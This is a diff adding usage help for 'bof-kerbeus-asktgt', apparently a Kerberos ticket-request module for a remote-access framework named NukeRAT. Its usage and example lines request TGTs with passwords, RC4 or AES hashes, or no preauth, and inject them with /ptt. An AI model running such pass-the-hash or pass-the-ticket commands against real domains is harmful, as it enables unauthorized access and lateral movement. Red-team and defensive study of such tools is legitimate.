@@ -1,0 +1,17 @@
+ABOUT
+    Request a TGT using password, hash, or no preauth.
+USAGE:
+    bof-kerbeus-asktgt --- /user:USER /password:PASSWORD [/domain:DOMAIN] [/dc:DC] [/enctype:{rc4|aes256}] [/ptt] [/nopac] [/opsec]
+    bof-kerbeus-asktgt --- /user:USER /aes256:HASH [/domain:DOMAIN] [/dc:DC] [/ptt]
+    bof-kerbeus-asktgt --- /user:USER /rc4:HASH [/domain:DOMAIN] [/dc:DC] [/ptt]
+    bof-kerbeus-asktgt --- /user:USER /nopreauth [/domain:DOMAIN] [/dc:DC] [/ptt]
+
+EXAMPLES:
+    bof-kerbeus-asktgt --- /user:admin /password:P@ss /domain:corp.local /ptt
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    bof-kerbeus-asktgt -w 60 --- /user:admin /password:P@ss /domain:corp.local /ptt
